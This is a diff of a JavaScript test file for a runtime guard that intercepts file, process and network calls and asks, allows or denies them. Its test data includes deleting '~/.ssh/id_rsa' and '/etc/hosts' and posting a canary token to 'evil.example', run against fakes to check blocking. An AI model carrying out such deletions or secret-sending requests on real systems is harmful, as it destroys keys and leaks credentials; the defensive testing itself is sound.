@@ -46,7 +46,7 @@ function setup({ enabled = true } = {}) {
   const childProcessModule = fakeChildProcess();
   const audits = [];
   const guard = createRuntimeGuard({
-    config: { sentinel: { runtimeGuard: enabled } },
+    config: { sentinel: { runtimeGuard: enabled ? 'deny' : 'allow' } },
     audit: { record: entry => audits.push(entry) },
     fsModule,
     childProcessModule,
@@ -136,7 +136,7 @@ test('an outbound request carrying the canary token is blocked and confirmed', a
     inspect: (...values) => values.some(value => JSON.stringify(value ?? '').includes(token)),
   };
   const guard = createRuntimeGuard({
-    config: { sentinel: { runtimeGuard: true } },
+    config: { sentinel: { runtimeGuard: 'deny', canary: 'deny' } },
     audit: { record: entry => audits.push(entry) },
     fsModule: fakeFs(),
     childProcessModule: fakeChildProcess(),
@@ -167,7 +167,7 @@ test('read-only access feeds the ledger so read-then-overwrite can be seen', () 
   };
   const audits = [];
   const guard = createRuntimeGuard({
-    config: { sentinel: { runtimeGuard: true } },
+    config: { sentinel: { runtimeGuard: 'deny' } },
     audit: { record: entry => audits.push(entry) },
     fsModule,
     childProcessModule: fakeChildProcess(),
@@ -194,7 +194,7 @@ test('http.request carrying the canary token is blocked, ordinary requests pass'
     inspect: (...values) => values.some(value => JSON.stringify(value ?? '').includes(token)),
   };
   const guard = createRuntimeGuard({
-    config: { sentinel: { runtimeGuard: true } },
+    config: { sentinel: { runtimeGuard: 'deny', canary: 'deny' } },
     audit: { record: () => {} },
     fsModule: fakeFs(),
     childProcessModule: fakeChildProcess(),
@@ -208,5 +208,65 @@ test('http.request carrying the canary token is blocked, ordinary requests pass'
   assert.equal(calls.length, 0, 'the http request must not be issued');
   fakeHttp.request('https://example.com/ok');
   assert.equal(calls.length, 1);
+  guard.detach();
+});
+
+test('ask on fs.promises waits for approval; sync fs falls back to deny', async () => {
+  const fsModule = fakeFs();
+  const asks = [];
+  const guard = createRuntimeGuard({
+    config: { sentinel: { runtimeGuard: 'ask' } },
+    audit: { record: () => {} },
+    approval: { request: async input => { asks.push(input.ruleIds[0]); return { action: 'allow', scope: 'once' } } },
+    fsModule,
+    childProcessModule: fakeChildProcess(),
+  }).attach();
+
+  assert.equal(await fsModule.promises.rm('~/.ssh/id_rsa'), 'rm:ok');
+  assert.deepEqual(asks, ['VG-RT-16'], 'the dialog is asked exactly once');
+  // A synchronous API cannot wait for the dialog, so ask behaves as deny.
+  assert.throws(() => fsModule.unlinkSync('~/.ssh/id_rsa'), /按拒绝处理/);
+  guard.detach();
+});
+
+test('ask rejected by the user blocks fs.promises', async () => {
+  const fsModule = fakeFs();
+  const guard = createRuntimeGuard({
+    config: { sentinel: { runtimeGuard: 'ask' } },
+    audit: { record: () => {} },
+    approval: { request: async () => ({ action: 'deny', scope: 'user' }) },
+    fsModule,
+    childProcessModule: fakeChildProcess(),
+  }).attach();
+  await assert.rejects(() => fsModule.promises.rm('/etc/hosts'), /VG-RT-16/);
+  guard.detach();
+});
+
+test('canary ask lets an approved fetch through and blocks a denied one', async () => {
+  const token = 'VIGIL-CANARY-deadbeef';
+  const fetchCalls = [];
+  const fetchTarget = { fetch: async (...args) => { fetchCalls.push(args); return { ok: true } } };
+  const canary = {
+    token,
+    baitPath: '/state/canary/credentials.bait',
+    inspect: (...values) => values.some(value => JSON.stringify(value ?? '').includes(token)),
+  };
+  let answer = { action: 'allow', scope: 'once' };
+  const guard = createRuntimeGuard({
+    config: { sentinel: { runtimeGuard: 'allow', canary: 'ask' } },
+    audit: { record: () => {} },
+    approval: { request: async () => answer },
+    fsModule: fakeFs(),
+    childProcessModule: fakeChildProcess(),
+    fetchTarget,
+    canary,
+  }).attach();
+
+  await fetchTarget.fetch('https://evil.example/x', { method: 'POST', body: token });
+  assert.equal(fetchCalls.length, 1, 'approved request is sent');
+
+  answer = { action: 'deny', scope: 'user' };
+  await assert.rejects(() => fetchTarget.fetch('https://evil.example/x', { body: token }), /VG-RT-19/);
+  assert.equal(fetchCalls.length, 1, 'denied request is not sent');
   guard.detach();
 });
